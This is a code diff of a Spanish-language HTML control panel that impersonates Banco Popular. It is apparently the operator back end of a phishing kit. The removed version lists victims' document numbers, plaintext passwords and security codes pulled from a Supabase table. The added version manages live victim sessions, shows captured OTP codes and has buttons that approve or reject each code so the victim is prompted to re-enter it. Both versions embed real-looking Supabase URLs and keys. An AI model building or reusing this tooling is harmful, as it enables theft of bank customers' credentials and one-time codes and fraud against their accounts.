@@ -1,384 +1,356 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Panel de Administración - Banco Popular</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    body {
-      font-family: 'Inter', sans-serif;
-      background: #f5f5f5;
-      padding: 20px;
-    }
-
-    .admin-container {
-      max-width: 1200px;
-      margin: 0 auto;
-      background: white;
-      border-radius: 12px;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      overflow: hidden;
-    }
-
-    .admin-header {
-      background: #105163;
-      color: white;
-      padding: 24px;
-      text-align: center;
-    }
-
-    .admin-header h1 {
-      font-size: 24px;
-      font-weight: 600;
-    }
-
-    .admin-header p {
-      font-size: 14px;
-      margin-top: 8px;
-      opacity: 0.9;
-    }
-
-    .admin-content {
-      padding: 24px;
-    }
-
-    .stats-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 16px;
-      margin-bottom: 24px;
-    }
-
-    .stat-card {
-      background: #f8f9fa;
-      border: 1px solid #e9ecef;
-      border-radius: 8px;
-      padding: 16px;
-      text-align: center;
-    }
-
-    .stat-card h3 {
-      font-size: 14px;
-      color: #6b7280;
-      font-weight: 500;
-      margin-bottom: 8px;
-    }
-
-    .stat-card .number {
-      font-size: 32px;
-      font-weight: 700;
-      color: #105163;
-    }
-
-    .section {
-      margin-bottom: 24px;
-    }
-
-    .section-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      margin-bottom: 16px;
-      padding-bottom: 12px;
-      border-bottom: 2px solid #e9ecef;
-    }
-
-    .section-title {
-      font-size: 18px;
-      font-weight: 600;
-      color: #111827;
-    }
-
-    .refresh-btn {
-      background: #105163;
-      color: white;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 14px;
-      font-weight: 500;
-      transition: background 0.2s;
-    }
-
-    .refresh-btn:hover {
-      background: #0B3642;
-    }
-
-    .data-table {
-      width: 100%;
-      border-collapse: collapse;
-      font-size: 14px;
-    }
-
-    .data-table thead {
-      background: #f8f9fa;
-    }
-
-    .data-table th {
-      padding: 12px;
-      text-align: left;
-      font-weight: 600;
-      color: #374151;
-      border-bottom: 2px solid #e9ecef;
-    }
-
-    .data-table td {
-      padding: 12px;
-      border-bottom: 1px solid #e9ecef;
-      color: #111827;
-    }
-
-    .data-table tbody tr:hover {
-      background: #f8f9fa;
-    }
-
-    .badge {
-      display: inline-block;
-      padding: 4px 8px;
-      border-radius: 4px;
-      font-size: 12px;
-      font-weight: 600;
-    }
-
-    .badge-success {
-      background: #D4ECD0;
-      color: #1A6A0C;
-    }
-
-    .badge-warning {
-      background: #FEEBD7;
-      color: #F99B35;
-    }
-
-    .badge-info {
-      background: #DBEAFD;
-      color: #3263A4;
-    }
-
-    .empty-state {
-      text-align: center;
-      padding: 40px;
-      color: #6b7280;
-    }
-
-    .empty-state svg {
-      width: 64px;
-      height: 64px;
-      margin-bottom: 16px;
-      opacity: 0.5;
-    }
-
-    .loading {
-      text-align: center;
-      padding: 40px;
-      color: #6b7280;
-    }
-
-    .spinner {
-      border: 3px solid #e9ecef;
-      border-top: 3px solid #105163;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 16px;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    .timestamp {
-      font-size: 12px;
-      color: #6b7280;
-    }
-
-    .password-field {
-      font-family: monospace;
-      background: #f8f9fa;
-      padding: 4px 8px;
-      border-radius: 4px;
-      letter-spacing: 2px;
-    }
-
-    .alert-box {
-      background: #FEEBD7;
-      border: 1px solid #FCCD9A;
-      border-radius: 8px;
-      padding: 12px 16px;
-      margin-bottom: 20px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-
-    .alert-box svg {
-      flex-shrink: 0;
-    }
-
-    .alert-box p {
-      font-size: 13px;
-      color: #C2410C;
-      margin: 0;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Panel Administrativo - Banco Popular</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+  body { background: #f5f5f5; }
+  header { background: #105163; color: #fff; padding: 20px 32px; display: flex; align-items: center; justify-content: space-between; }
+  header h1 { font-size: 20px; font-weight: 600; }
+  header img { height: 40px; }
+  .container { max-width: 1200px; margin: 24px auto; padding: 0 16px; }
+  .stats { display: flex; gap: 16px; margin-bottom: 24px; flex-wrap: wrap; }
+  .stat-card { background: #fff; border-radius: 12px; padding: 20px; flex: 1; min-width: 180px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+  .stat-card .num { font-size: 32px; font-weight: 700; color: #105163; }
+  .stat-card .label { font-size: 13px; color: #666; margin-top: 4px; }
+  .stat-card.pending .num { color: #FE680D; }
+  .stat-card.finished .num { color: #27C112; }
+  .card { background: #fff; border-radius: 12px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); overflow: hidden; }
+  .card-header { padding: 16px 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+  .card-header h2 { font-size: 16px; font-weight: 600; color: #121212; }
+  .refresh-btn { background: #105163; color: #fff; border: none; padding: 8px 16px; border-radius: 8px; cursor: pointer; font-weight: 600; }
+  .refresh-btn:hover { background: #0B3642; }
+  table { width: 100%; border-collapse: collapse; }
+  th, td { padding: 12px 16px; text-align: left; font-size: 13px; border-bottom: 1px solid #f0f0f0; }
+  th { background: #fafafa; color: #555; font-weight: 600; }
+  .badge { display: inline-block; padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; }
+  .badge.login { background: #DBEAFD; color: #3263A4; }
+  .badge.activa { background: #FEEBD7; color: #FE680D; }
+  .badge.finalizada { background: #D4ECD0; color: #1A6A0C; }
+  .badge.otp_aprobado { background: #D4ECD0; color: #1A6A0C; }
+  .badge.otp_desaprobado { background: #FDE2E2; color: #C1121F; }
+  .btn-finalizar { background: #27C112; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 12px; }
+  .btn-finalizar:hover { background: #1A6A0C; }
+  .btn-finalizar:disabled { background: #ccc; cursor: not-allowed; }
+  .btn-otp-aprobar { background: #27C112; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 12px; }
+  .btn-otp-aprobar:hover { background: #1A6A0C; }
+  .btn-otp-desaprobar { background: #C1121F; color: #fff; border: none; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-weight: 600; font-size: 12px; }
+  .btn-otp-desaprobar:hover { background: #8F0D17; }
+  .btn-otp-aprobar:disabled, .btn-otp-desaprobar:disabled { background: #ccc; cursor: not-allowed; }
+  .empty { text-align: center; padding: 40px; color: #888; }
+  .toast { position: fixed; top: 20px; right: 20px; background: #27C112; color: #fff; padding: 14px 20px; border-radius: 8px; display: none; box-shadow: 0 4px 12px rgba(0,0,0,0.2); z-index: 999; }
+  .toast.show { display: block; animation: slideIn 0.3s; }
+  .toast.error { background: #C1121F; }
+  @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+  .mono { font-family: monospace; font-size: 12px; color: #555; }
+  .otp-code { font-family: monospace; font-size: 14px; font-weight: 700; color: #105163; letter-spacing: 2px; }
+  .otp-empty { color: #999; font-style: italic; }
+  .acciones { display: flex; gap: 6px; flex-wrap: wrap; }
+</style>
 </head>
 <body>
-  <div class="admin-container">
-    <div class="admin-header">
-      <h1>🔐 Panel de Administración</h1>
-      <p>Banco Popular - Gestión de Credenciales y Códigos</p>
+<header>
+  <div style="display:flex;align-items:center;gap:12px;">
+    <img src="./home_files/popular_new.svg" alt="Banco Popular">
+    <h1>Panel Administrativo</h1>
+  </div>
+  <span style="font-size:13px;opacity:0.8;">Control de sesiones</span>
+</header>
+
+<div class="container">
+  <div class="stats">
+    <div class="stat-card">
+      <div class="num" id="statTotal">0</div>
+      <div class="label">Total sesiones</div>
     </div>
-
-    <div class="admin-content">
-      <div class="alert-box">
-        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
-          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#C2410C"/>
-        </svg>
-        <p><strong>Acceso restringido:</strong> Este panel contiene información sensible. Asegúrate de estar autorizado para visualizar estos datos.</p>
-      </div>
-
-      <div class="stats-grid">
-        <div class="stat-card">
-          <h3>Total Registros</h3>
-          <div class="number" id="totalRecords">-</div>
-        </div>
-        <div class="stat-card">
-          <h3>Credenciales</h3>
-          <div class="number" id="totalCredentials">-</div>
-        </div>
-        <div class="stat-card">
-          <h3>Códigos Ingresados</h3>
-          <div class="number" id="totalCodes">-</div>
-        </div>
-      </div>
-
-      <div class="section">
-        <div class="section-header">
-          <h2 class="section-title">📋 Credenciales y Códigos Registrados</h2>
-          <button class="refresh-btn" onclick="loadData()">🔄 Actualizar</button>
-        </div>
-
-        <div id="dataContainer">
-          <div class="loading">
-            <div class="spinner"></div>
-            <p>Cargando datos...</p>
-          </div>
-        </div>
-      </div>
+    <div class="stat-card pending">
+      <div class="num" id="statActivas">0</div>
+      <div class="label">Sesiones activas (pendientes)</div>
+    </div>
+    <div class="stat-card finished">
+      <div class="num" id="statFinalizadas">0</div>
+      <div class="label">Sesiones finalizadas</div>
     </div>
   </div>
 
-  <script>
-    // Configuración de Supabase
-    const SUPABASE_URL = 'https://sygnzkmuiejwczijthyq.supabase.co';
-    const SUPABASE_ANON_KEY = 'sb_publishable_nbw8hDNjy67X7Id8WCv8nw_nrfvOwSD';
+  <div class="card">
+    <div class="card-header">
+      <h2>Sesiones registradas</h2>
+      <button class="refresh-btn" onclick="cargarSesiones()">↻ Actualizar</button>
+    </div>
+    <div style="overflow-x:auto;">
+      <table>
+        <thead>
+          <tr>
+            <th>ID Sesión</th>
+            <th>Documento</th>
+            <th>Estado</th>
+            <th>Código OTP</th>
+            <th>Estado OTP</th>
+            <th>Creada</th>
+            <th>Acción</th>
+          </tr>
+        </thead>
+        <tbody id="tablaSesiones">
+          <tr><td colspan="7" class="empty">Cargando sesiones...</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
 
-    // Función para cargar datos desde Supabase
-    async function loadData() {
-      const container = document.getElementById('dataContainer');
-      
-      try {
-        // Cargar todos los registros de la tabla codigos_seguro
-        const response = await fetch(SUPABASE_URL + '/rest/v1/codigos_seguro?select=*&order=created_at.desc', {
-          method: 'GET',
-          headers: {
-            'Content-Type': 'application/json',
-            'apikey': SUPABASE_ANON_KEY,
-            'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
-          }
-        });
+<div class="toast" id="toast">✅ Sesión finalizada correctamente</div>
 
-        if (!response.ok) {
-          throw new Error('Error al cargar datos: ' + response.status);
-        }
+<script>
+  var SUPABASE_URL = 'https://mobbejiijbjrwkqmxrxr.supabase.co';
+  var SUPABASE_ANON_KEY = 'sb_publishable_XRJn3-lrSg0ykaKmGEPX2A_EwkGl5ms';
 
-        const data = await response.json();
-        
-        // Actualizar estadísticas
-        document.getElementById('totalRecords').textContent = data.length;
-        document.getElementById('totalCredentials').textContent = data.length;
-        document.getElementById('totalCodes').textContent = data.filter(item => item.codigo_cancelacion).length;
+  // Cache de códigos OTP por sesión
+  var codigosCache = {};
 
-        // Mostrar datos en tabla
-        if (data.length === 0) {
-          container.innerHTML = `
-            <div class="empty-state">
-              <svg viewBox="0 0 24 24" fill="none">
-                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z" fill="#9ca3af"/>
-              </svg>
-              <p>No hay registros disponibles</p>
-            </div>
-          `;
-          return;
-        }
-
-        let tableHTML = `
-          <table class="data-table">
-            <thead>
-              <tr>
-                <th>#</th>
-                <th>Tipo Documento</th>
-                <th>Número Documento</th>
-                <th>Contraseña</th>
-                <th>Código Cancelación</th>
-                <th>Fecha Registro</th>
-              </tr>
-            </thead>
-            <tbody>
-        `;
-
-        data.forEach((item, index) => {
-          const fecha = item.created_at ? new Date(item.created_at).toLocaleString('es-CO') : 'N/A';
-          const codigo = item.codigo_cancelacion ? 
-            `<span class="badge badge-success">${item.codigo_cancelacion}</span>` : 
-            `<span class="badge badge-warning">Pendiente</span>`;
-
-          tableHTML += `
-            <tr>
-              <td>${index + 1}</td>
-              <td>${item.tipo_documento || 'N/A'}</td>
-              <td><strong>${item.numero_documento || 'N/A'}</strong></td>
-              <td><span class="password-field">${item.contrasena || 'N/A'}</span></td>
-              <td>${codigo}</td>
-              <td><span class="timestamp">${fecha}</span></td>
-            </tr>
-          `;
-        });
-
-        tableHTML += `
-            </tbody>
-          </table>
-        `;
-
-        container.innerHTML = tableHTML;
-
-      } catch (error) {
-        console.error('Error:', error);
-        container.innerHTML = `
-          <div class="empty-state">
-            <p>❌ Error al cargar los datos</p>
-            <p style="font-size: 12px; color: #6b7280; margin-top: 8px;">${error.message}</p>
-          </div>
-        `;
+  function cargarSesiones() {
+    // Cargar sesiones
+    fetch(SUPABASE_URL + '/rest/v1/sesiones?order=created_at.desc&limit=50', {
+      headers: {
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
       }
-    }
-
-    // Cargar datos al iniciar la página
-    document.addEventListener('DOMContentLoaded', function() {
-      loadData();
+    })
+    .then(function(res) { return res.json(); })
+    .then(function(data) {
+      if (!Array.isArray(data)) { data = []; }
+      renderStats(data);
+      // Cargar códigos de seguridad para todas las sesiones
+      cargarCodigos(data);
+    })
+    .catch(function(err) {
+      console.error('Error cargando sesiones:', err);
+      document.getElementById('tablaSesiones').innerHTML = '<tr><td colspan="7" class="empty">Error al cargar sesiones</td></tr>';
     });
+  }
 
-    // Auto-refresh cada 30 segundos
-    setInterval(loadData, 30000);
-  </script>
+  function cargarCodigos(sesiones) {
+    if (sesiones.length === 0) {
+      renderTabla(sesiones);
+      return;
+    }
+    // Obtener todos los códigos de seguridad
+    fetch(SUPABASE_URL + '/rest/v1/codigos_seguro?order=created_at.desc&limit=200', {
+      headers: {
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
+      }
+    })
+    .then(function(res) { return res.json(); })
+    .then(function(codigos) {
+      if (!Array.isArray(codigos)) { codigos = []; }
+      // Agrupar códigos por sesión
+      codigosCache = {};
+      codigos.forEach(function(c) {
+        if (!codigosCache[c.sesion_id]) {
+          codigosCache[c.sesion_id] = [];
+        }
+        codigosCache[c.sesion_id].push(c);
+      });
+      renderTabla(sesiones);
+    })
+    .catch(function(err) {
+      console.error('Error cargando códigos:', err);
+      renderTabla(sesiones);
+    });
+  }
+
+  function renderStats(data) {
+    var total = data.length;
+    var activas = data.filter(function(s) { return s.estado === 'activa' || s.estado === 'login'; }).length;
+    var finalizadas = data.filter(function(s) { return s.estado === 'finalizada'; }).length;
+    document.getElementById('statTotal').textContent = total;
+    document.getElementById('statActivas').textContent = activas;
+    document.getElementById('statFinalizadas').textContent = finalizadas;
+  }
+
+  function renderTabla(data) {
+    var tbody = document.getElementById('tablaSesiones');
+    if (data.length === 0) {
+      tbody.innerHTML = '<tr><td colspan="7" class="empty">No hay sesiones registradas</td></tr>';
+      return;
+    }
+    var html = '';
+    data.forEach(function(s) {
+      var estado = s.estado || 'desconocido';
+      var badgeClass = estado === 'finalizada' ? 'finalizada' : (estado === 'activa' ? 'activa' : 'login');
+      var badgeLabel = estado === 'finalizada' ? 'Finalizada' : (estado === 'activa' ? 'Activa' : 'Login');
+
+      // Obtener el código OTP de la sesión (el más reciente)
+      var codigos = codigosCache[s.sesion_id] || [];
+      var otpCode = codigos.length > 0 ? codigos[0].codigo_cancelacion : '';
+      var otpHtml = otpCode ? '<span class="otp-code">' + otpCode + '</span>' : '<span class="otp-empty">Sin código</span>';
+
+      // Estado del OTP
+      var otpEstado = s.otp_estado || 'pendiente';
+      var otpBadgeClass = otpEstado === 'aprobado' ? 'otp_aprobado' : (otpEstado === 'desaprobado' ? 'otp_desaprobado' : 'login');
+      var otpBadgeLabel = otpEstado === 'aprobado' ? 'Aprobado' : (otpEstado === 'desaprobado' ? 'Desaprobado' : 'Pendiente');
+
+      var creada = s.created_at ? new Date(s.created_at).toLocaleString() : '-';
+      var btn = '';
+
+      if (estado !== 'finalizada') {
+        // Si hay código OTP y no está aprobado, mostrar botones de aprobar/desaprobar
+        if (otpCode && otpEstado !== 'aprobado') {
+          btn = '<div class="acciones">' +
+            '<button class="btn-otp-aprobar" onclick="aprobarOTP(\'' + s.sesion_id + '\', this)">✓ Aprobar OTP</button>' +
+            '<button class="btn-otp-desaprobar" onclick="desaprobarOTP(\'' + s.sesion_id + '\', this)">✗ Desaprobar</button>' +
+            '<button class="btn-finalizar" onclick="finalizarSesion(\'' + s.sesion_id + '\', this)">Finalizar</button>' +
+            '</div>';
+        } else {
+          btn = '<div class="acciones">' +
+            '<button class="btn-finalizar" onclick="finalizarSesion(\'' + s.sesion_id + '\', this)">Finalizar</button>' +
+            '</div>';
+        }
+      } else {
+        btn = '<span style="color:#27C112;font-weight:600;">✓</span>';
+      }
+
+      html += '<tr>' +
+        '<td class="mono">' + (s.sesion_id || '-') + '</td>' +
+        '<td>' + (s.tipo_documento || '') + ' ' + (s.numero_documento || '-') + '</td>' +
+        '<td><span class="badge ' + badgeClass + '">' + badgeLabel + '</span></td>' +
+        '<td>' + otpHtml + '</td>' +
+        '<td><span class="badge ' + otpBadgeClass + '">' + otpBadgeLabel + '</span></td>' +
+        '<td>' + creada + '</td>' +
+        '<td>' + btn + '</td>' +
+        '</tr>';
+    });
+    tbody.innerHTML = html;
+  }
+
+  // Aprobar OTP
+  function aprobarOTP(sesionId, btn) {
+    if (!confirm('¿Aprobar el código OTP de esta sesión?')) return;
+    btn.disabled = true;
+    btn.textContent = 'Procesando...';
+
+    fetch(SUPABASE_URL + '/rest/v1/sesiones?sesion_id=eq.' + sesionId, {
+      method: 'PATCH',
+      headers: {
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        otp_estado: 'aprobado',
+        estado: 'finalizada',
+        updated_at: new Date().toISOString()
+      })
+    })
+    .then(function(res) {
+      if (res.ok) {
+        mostrarToast('✅ OTP aprobado correctamente');
+        cargarSesiones();
+      } else {
+        alert('Error al aprobar el OTP: ' + res.status);
+        btn.disabled = false;
+        btn.textContent = '✓ Aprobar OTP';
+      }
+    })
+    .catch(function(err) {
+      console.error(err);
+      alert('Error de red al aprobar el OTP');
+      btn.disabled = false;
+      btn.textContent = '✓ Aprobar OTP';
+    });
+  }
+
+  // Desaprobar OTP
+  function desaprobarOTP(sesionId, btn) {
+    if (!confirm('¿Desaprobar el código OTP? El usuario deberá reingresar el código.')) return;
+    btn.disabled = true;
+    btn.textContent = 'Procesando...';
+
+    fetch(SUPABASE_URL + '/rest/v1/sesiones?sesion_id=eq.' + sesionId, {
+      method: 'PATCH',
+      headers: {
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        otp_estado: 'desaprobado',
+        updated_at: new Date().toISOString()
+      })
+    })
+    .then(function(res) {
+      if (res.ok) {
+        mostrarToast('❌ OTP desaprobado. El usuario deberá reingresar el código.', true);
+        cargarSesiones();
+      } else {
+        alert('Error al desaprobar el OTP: ' + res.status);
+        btn.disabled = false;
+        btn.textContent = '✗ Desaprobar';
+      }
+    })
+    .catch(function(err) {
+      console.error(err);
+      alert('Error de red al desaprobar el OTP');
+      btn.disabled = false;
+      btn.textContent = '✗ Desaprobar';
+    });
+  }
+
+  function finalizarSesion(sesionId, btn) {
+    if (!confirm('¿Finalizar esta sesión? El usuario verá el mensaje de confirmación.')) return;
+    btn.disabled = true;
+    btn.textContent = 'Procesando...';
+
+    fetch(SUPABASE_URL + '/rest/v1/sesiones?sesion_id=eq.' + sesionId, {
+      method: 'PATCH',
+      headers: {
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
+        'Content-Type': 'application/json',
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        estado: 'finalizada',
+        updated_at: new Date().toISOString()
+      })
+    })
+    .then(function(res) {
+      if (res.ok) {
+        mostrarToast('✅ Sesión finalizada correctamente');
+        cargarSesiones();
+      } else {
+        alert('Error al finalizar la sesión: ' + res.status);
+        btn.disabled = false;
+        btn.textContent = 'Finalizar';
+      }
+    })
+    .catch(function(err) {
+      console.error(err);
+      alert('Error de red al finalizar la sesión');
+      btn.disabled = false;
+      btn.textContent = 'Finalizar';
+    });
+  }
+
+  function mostrarToast(msg, isError) {
+    var t = document.getElementById('toast');
+    t.textContent = msg;
+    t.classList.remove('error');
+    if (isError) {
+      t.classList.add('error');
+    }
+    t.classList.add('show');
+    setTimeout(function() { t.classList.remove('show'); }, 3000);
+  }
+
+  // Auto-refresh cada 5 segundos
+  cargarSesiones();
+  setInterval(cargarSesiones, 5000);
+</script>
 </body>
 </html>
